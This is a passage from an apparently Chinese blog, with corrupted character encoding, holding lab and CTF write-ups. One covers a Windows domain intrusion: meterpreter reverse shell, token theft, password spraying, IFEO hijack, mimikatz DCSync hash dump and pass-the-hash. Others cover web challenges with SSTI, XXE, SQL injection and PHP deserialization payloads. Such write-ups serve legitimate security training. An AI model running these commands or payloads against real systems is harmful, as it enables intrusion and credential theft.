172.22.8.31 86ä¸»æœºå: WIN19-CLIENT 87å‘ç°çš„ç½‘ç»œæ¥å£: 88 IPv4åœ°å€: 89 â””â”€ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.46 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.18 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 32/32 æ‰«åˆ°ä¸‰å°æœºå­\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥åˆ©ç”¨çš„æœåŠ¡\né‚£æˆ‘ä»¬æ¥ç€ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nnet user ä¸»æœºå: WIN-WEB\rOS åç§°: Microsoft Windows Server 2016 Datacenter\rOS ç‰ˆæœ¬: 10.0.14393 æš‚ç¼º Build 14393\rOS åˆ¶é€ å•†: Microsoft Corporation\rOS é…ç½®: ç‹¬ç«‹æœåŠ¡å™¨\rOS æ„ä»¶ç±»å‹: Multiprocessor Free\ræ³¨å†Œçš„æ‰€æœ‰äºº:\ræ³¨å†Œçš„ç»„ç»‡: Aliyun\räº§å“ ID: 00376-40000-00000-AA947\råˆå§‹å®‰è£…æ—¥æœŸ: 2022/7/11, 12:46:14\rç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2025/3/9, 18:28:29\rç³»ç»Ÿåˆ¶é€ å•†: Alibaba Cloud\rç³»ç»Ÿå‹å·: Alibaba Cloud ECS\rç³»ç»Ÿç±»å‹: x64-based PC\rå¤„ç†å™¨: å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS ç‰ˆæœ¬: SeaBIOS 449e491, 2014/4/1\rWindows ç›®å½•: C:\\Windows\rç³»ç»Ÿç›®å½•: C:\\Windows\\system32\rå¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1\rç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\rè¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\ræ—¶åŒº: (UTC+08:00) åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½\rç‰©ç†å†…å­˜æ€»é‡: 3,950 MB\rå¯ç”¨çš„ç‰©ç†å†…å­˜: 883 MB\rè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 5,848 MB\rè™šæ‹Ÿå†…å­˜: å¯ç”¨: 1,169 MB\rè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 4,679 MB\ré¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys\råŸŸ: WORKGROUP\rç™»å½•æœåŠ¡å™¨: æš‚ç¼º\rä¿®è¡¥ç¨‹åº: å®‰è£…äº† 6 ä¸ªä¿®è¡¥ç¨‹åºã€‚\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\rç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚\r[01]: Red Hat VirtIO Ethernet Adapter\rè¿æ¥å: ä»¥å¤ªç½‘\rå¯ç”¨ DHCP: æ˜¯\rDHCP æœåŠ¡å™¨: 172.22.255.253\rIP åœ°å€\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ C:\\Tmp\u0026gt;net user\r\\\\ çš„ç”¨æˆ·å¸æˆ·\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\rå‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚ C:\\Tmp\u0026gt;quser\rç”¨æˆ·å ä¼šè¯å ID çŠ¶æ€ ç©ºé—²æ—¶é—´ ç™»å½•æ—¶é—´\rjohn rdp-tcp#0 2 è¿è¡Œä¸­ 2:38 2025/3/9 18:30 å‘ç°ä¸€ä¸ªjohnç”¨æˆ·è¿œç¨‹è¿æ¥æœ¬å°æœºå­\nä¸ºäº†æ–¹ä¾¿å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·rdpè¿ä¸Šå»\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\ræ“ä½œæˆåŠŸå®Œæˆã€‚ ç®¡ç†å‘˜æƒé™å¯ä»¥å·RDPç”¨æˆ·çš„tokenï¼Œä»è€ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„ç›˜ã€‚\nè¿™é‡Œå¯ä»¥ç”¨msfçš„incognitoæ¨¡å—\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe å…ˆç”¨msfä¸Šä¸ªçº¿\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit ä¸Šçº¿\næ¥ç€ç”¨incognitoæ¨¡å—å·Johnçš„token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°Johnçš„tokenäº†\nä»¥Johnçš„èº«ä»½è¿è¡Œcmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™ä¹±ç äº†ï¼‰\næŒ‚è½½äº†cç›˜\næŸ¥çœ‹cç›˜ä¸­çš„credential.txtæ–‡ä»¶\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? è¿™é‡Œæœ‰ä¸€ä¸²è´¦å·å¯†ç ï¼Œç”¨è¿™ä¸²è´¦å·å¯†ç è¿›è¡Œä¸€ä¸ªå¯†ç å–·æ´’\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# â”Œâ”€â”€(rootã‰¿Xrntkk-Laptop)-[/home/xrntkk]\râ””â”€# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE å¯ä»¥çœ‹åˆ°è¿™ä¸‰å°æœºè²Œä¼¼éƒ½èƒ½ç™»ä¸Šå»\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) æˆ‘è¿™é‡Œé€‰æ‹©ç™»31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; è¿™é‡Œè¦ç”¨rdesktopç™»ï¼Œrdpç™»ä¸ä¸Š\nä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ”¹ä¸ªå¯†ç å°±è¡Œäº†\nä½†æ˜¯æ”¹å®Œå¯†ç è¿™å°æœºè¿˜æ˜¯ç™»ä¸ä¸Šï¼Œæ²¡æœ‰ç™»é™†æƒé™\næ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªä¿®æ”¹åçš„è´¦å·å¯†ç å†å»ç™»è¿™ä¸ªè´¦å·çš„å¦ä¸€å°æœºå­\næˆåŠŸåœ¨46ä¸­ç™»å…¥ï¼Œåé¢è¿˜æ˜¯ç”¨rdpå§ï¼Œrdesktopä¹Ÿå¤ªå¡äº†\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿ä¸‹åŸŸå†…çš„ä¸€å°æœºå­äº†\nsysteminfo è¿™å°æœºå­ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…±äº«æ–‡ä»¶å¤¹çš„æ–¹å¼æ¥ä¼ æ–‡ä»¶\nè¿™é‡Œæˆ‘æ˜¯ç”¨ç¬¬ä¸€å°æœºå­(172.22.8.18)ï¼Œå°†æ–‡ä»¶å¤¹C:/xrntkkå…±äº«ç»™(172.22.8.46)\nåœ¨46ä¸ŠWin+Rå¹¶è¾“å…¥\n\\\\172.22.8.18 è¾“å…¥18å…±äº«æ–‡ä»¶çš„è´¦å·å¯†ç å³å¯\næ¥ç€æˆ‘ä»¬ç”¨bloodhoundæ¥è¿›è¡Œä¸€ä¸‹åŸŸå†…ä¿¡æ¯æ”¶é›†\nSharpHound.exe -c all å°†æ•°æ®é‡‡é›†å®Œç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œä¸Šä¼ å¯¼å…¥åˆ°BloodHoundåˆ†æ\nä»å›¾ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°46è¿™å°æœºå­çš„ç”¨æˆ·æ˜¯åŸŸç®¡ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•åœ¨è¿™å°æœºå­ä¸Šææƒï¼Œç„¶åæ‹¿ä¸‹åŸŸæ§\næ ¹æ®å‰é¢çš„hint\nDo you know how to hijack Image? æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥è¦è¿›è¡Œé•œåƒåŠ«æŒ(IFEO)ææƒ\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯è·å–æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚\nNT AUTHORITY\\Authenticated Users æˆ‘ä»¬å¯ä»¥å‘ç°å…¨éƒ¨å·²ç™»å½•ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œä¿®æ”¹\né‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæ˜ åƒåŠ«æŒ\næˆ‘ä»¬è¿™é‡Œé€šè¿‡å°†æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\\windows\\system32\\cmd.exeï¼Œæ¥è¿›è¡Œææƒ\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; ä¿®æ”¹åé€‰æ‹©é”å®š\nåœ¨é”å®šé¡µé¢é€‰æ‹©æ”¾å¤§é•œå³å¯\ntype c:\\Users\\Administrator\\flag\\flag02.txt æ¥ç€æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·è®©rdpå¯ä»¥è¿ä¸Šå»\nFLAG3 æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„å°†åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œdumpä¸‹æ¥\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt ç»“æœ\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! ä¹‹åå°±å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨äº†\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt æ‹¿åˆ°æœ€åä¸€ä¸ªflag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} è¿™é¢˜ç”¨csæ‰“ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è€ƒè™‘åˆ°ï¼Œæ‰€ä»¥åé¢ä¹Ÿä¸€ç›´æ²¡ç”¨ã€‚\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup"},{"content":"æˆ˜é˜Ÿåï¼šæˆ‘è¦æ‰“å¥¥æ–¯æ±€major\næ¯”èµ›æ’åï¼š5\nWeb upload?SSTI! è¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹å¹¶è¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼Œå­˜åœ¨ssti\næœ‰waf\n1def contains_dangerous_keywords(file_path): 2 dangerous_keywords = [\u0026#39;_\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;subclasses\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;__globals__\u0026#39;,\u0026#39;flag\u0026#39;,] 3 4 with open(file_path, \u0026#39;rb\u0026#39;) as f: 5 file_content = str(f.read()) 6 7 for keyword in dangerous_keywords: 8 if keyword in file_content: 9 return True # æ‰¾åˆ°å±é™©å…³é”®å­—ï¼Œè¿”å› True ç®€å•ç»•ä¸€ä¸‹\npayload:\n1{{\u0026#34;\u0026#34;[\u0026#39;\\x5f\\x5fclass\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fbase\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fsubcl\u0026#39;+\u0026#39;asses\\x5f\\x5f\u0026#39;]()[139][\u0026#39;\\x5f\\x5finit\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fglo\u0026#39;+\u0026#39;bals\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fbui\u0026#39;+\u0026#39;ltins\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;](\u0026#39;OS\u0026#39;.lower()).popen(\u0026#39;cat /f*\u0026#39;).read()}} éšä¾¿ä¼ ä¸ªtxtå°±è¡Œ\n(\u0026gt;ï¹\u0026lt;) é¢˜ç›®\n1from flask import Flask,request import base64 from lxml import etree import re app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): return open(__file__).read() @app.route(\u0026#39;/ghctf\u0026#39;,methods=[\u0026#39;POST\u0026#39;]) def parse(): xml=request.form.get(\u0026#39;xml\u0026#39;) print(xml) if xml is None: return \u0026#34;No System is Safe.\u0026#34; parser = etree.XMLParser(load_dtd=True, resolve_entities=True) root = etree.fromstring(xml, parser) name=root.find(\u0026#39;name\u0026#39;).text return name or None if __name__==\u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=8080) æ˜¯ä¸ªxxe\nç›´æ¥è¯»flag\n1curl -X POST http://node2.anna.nssctf.cn:28535/ghctf --data-urlencode \u0026#39;\u0026lt;!DOCTYPE data [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt; ]\u0026gt;\u0026lt;root\u0026gt;\u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt;\u0026lt;/root\u0026gt;\u0026#39; SQL??? 1url/?id=1 union select 1,2,3,4,sqlite_version() å‘ç°æ˜¯Sqlite\næ¥ç€æŸ¥è¡¨å°±è¡Œäº†\n1url/?id=1 union select 1,2,3,4,sql from sqlite_master 1?id=1 union select 1,2,3,4,select flag from flag 2//ç›´æ¥ä»flagè¡¨ä¸­æŸ¥flagåˆ—å°±è¡Œ Popppppp é¢˜ç›®\n1\u0026lt;?php 2error_reporting(0); 3 4class CherryBlossom { 5 public $fruit1; 6 public $fruit2; 7 8 public function __construct($a) { 9 $this-\u0026gt;fruit1 = $a; 10 } 11 12 function __destruct() { 13 echo $this-\u0026gt;fruit1; 14 } 15 16 public function __toString() { 17 $newFunc = $this-\u0026gt;fruit2; 18 return $newFunc(); 19 } 20} 21 22class Forbidden { 23 private $fruit3; 24 25 public function __construct($string) { 26 $this-\u0026gt;fruit3 = $string; 27 } 28 29 public function __get($name) { 30 $var = $this-\u0026gt;$name; 31 $var[$name](); 32 } 33} 34 35class Warlord { 36 public $fruit4; 37 public $fruit5; 38 public $arg1; 39 40 public function __call($arg1, $arg2) { 41 $function = $this-\u0026gt;fruit4; 42 return $function(); 43 } 44 45 public function __get($arg1) { 46 $this-\u0026gt;fruit5-\u0026gt;ll2(\u0026#39;b2\u0026#39;); 47 } 48} 49 50class Samurai { 51 public $fruit6; 52 public $fruit7; 53 54 public function __toString() { 55 $long = @$this-\u0026gt;fruit6-\u0026gt;add(); 56 return $long; 57 } 58 59 public function __set($arg1, $arg2) { 60 if ($this-\u0026gt;fruit7-\u0026gt;tt2) { 61 echo \u0026#34;xxx are the best!!!\u0026#34;; 62 } 63 } 64} 65 66class Mystery { 67 68 public function __get($arg1) { 69 array_walk($this, function ($day1, $day2) { 70 $day3 = new $day2($day1); 71 foreach ($day3 as $day4) { 72 echo ($day4 . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;); 73 } 74 }); 75 } 76} 77 78class Princess { 79 protected $fruit9; 80 81 protected function addMe() { 82 return \u0026#34;The time spent with xxx is my happiest time\u0026#34; . $this-\u0026gt;fruit9; 83 } 84 85 public function __call($func, $args) { 86 call_user_func([$this, $func . \u0026#34;Me\u0026#34;], $args); 87 } 88} 89 90class Philosopher { 91 public $fruit10; 92 public $fruit11=\u0026#34;sr22kaDugamdwTPhG5zU\u0026#34;; 93 94 public function __invoke() { 95 if (md5(md5($this-\u0026gt;fruit11)) == 666) { 96 return $this-\u0026gt;fruit10-\u0026gt;hey; 97 } 98 } 99} 100 101class UselessTwo { 102 public $hiddenVar = \u0026#34;123123\u0026#34;; 103 104 public function __construct($value) { 105 $this-\u0026gt;hiddenVar = $value; 106 } 107 108 public function __toString() { 109 return $this-\u0026gt;hiddenVar; 110 } 111} 112 113class Warrior { 114 public $fruit12; 115 private $fruit13; 116 117 public function __set($name, $value) { 118 $this-\u0026gt;$name = $value; 119 if ($this-\u0026gt;fruit13 == \u0026#34;xxx\u0026#34;) { 120 strtolower($this-\u0026gt;fruit12); 121 } 122 } 123} 124 125class UselessThree { 126 public $dummyVar; 127 128 public function __call($name, $args) { 129 return $name; 130 } 131} 132 133class UselessFour { 134 public $lalala; 135 136 public function __destruct() { 137 echo \u0026#34;Hehe\u0026#34;; 138 } 139} 140 141if (isset($_GET[\u0026#39;GHCTF\u0026#39;])) { 142 unserialize($_GET[\u0026#39;GHCTF\u0026#39;]); 143} else { 144 highlight_file(__FILE__); 145} 146 147?\u0026gt; è·Ÿå»å¹´ghctfçš„é¢˜ç›®å‡ ä¹ä¸€æ ·\nhttps://blog.csdn.net/liaochonxiang/article/details/140361138\nèµ°åˆ°Mysteryç±»ä¹‹ååˆ©ç”¨åŸç”Ÿç±»è¯»æ–‡ä»¶\nPOC\n1import hashlib 2import itertools 3import string 4 5for i in itertools.product(string.printable, repeat=3): 6 s = \u0026#39;\u0026#39;.join(i) 7 s1 = hashlib.md5(s.encode()).hexdigest() 8 s2 = hashlib.md5(s1.encode()).hexdigest() 9 if s2[:3] == \u0026#39;666\u0026#39;: 10 print(s) 11\u0026lt;?php 12class CherryBlossom{ 13 public $fruit1; 14 public $fruit2; 15} 16class Philosopher { 17 public $fruit10; 18 public $fruit11; 19} 20class Mystery{ 21 public $mystery; 22} 23$s = new CherryBlossom; 24$s-\u0026gt;fruit1 = new CherryBlossom; 25$s-\u0026gt;fruit1-\u0026gt;fruit2 = new Philosopher; 26$s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit11 = \u0026#39;Okg\u0026#39;; 27$s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10 = new Mystery; 28 29# $s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10-\u0026gt;FilesystemIterator=\u0026#39;/\u0026#39;; 30$s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10-\u0026gt;SplFileObject=\u0026#39;/flag44545615441084\u0026#39;; 31 32echo serialize($s); 33?\u0026gt; ez_readfile é¢˜ç›®\n1\u0026lt;?php 2 show_source(__FILE__); 3 if (md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { 4 if ($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]) { 5 if (is_string($_POST[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; is_string($_POST[\u0026#39;b\u0026#39;])) { 6 echo file_get_contents($_GET[\u0026#39;file\u0026#39;]); 7 } 8 } 9 } 10?\u0026gt; md5å¼ºç¢°æ’ï¼Œæˆ‘éšä¾¿æ‰¾äº†ä¸€å¯¹\n1M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 2 3ä¸ 4 5M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 æ¥ä¸‹æ¥çš„æ–‡ä»¶åŒ…å«å› ä¸ºä¸çŸ¥é“flagåæ²¡åŠæ³•ç›´æ¥è¯»ï¼Œå¾ˆè‡ªç„¶å°±èƒ½æƒ³åˆ°cnext\nhttps://github.com/kezibei/php-filter-iconv\næˆ‘ç”¨çš„è¿™ä¸ªå·¥å…·æ‰“ï¼Œæ„Ÿè§‰æ¯”åŸç‰ˆå¥½ç”¨\nåˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–è¯»mapså’ŒlibcäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œlibcçš„è·¯å¾„åœ¨mapsé‡Œé¢æœ‰\næ‹¿åˆ°æ–‡ä»¶ä¹‹åç›´æ¥ç”Ÿæˆpayloadæ‰“å°±è¡Œäº†\nezzzz_pickle 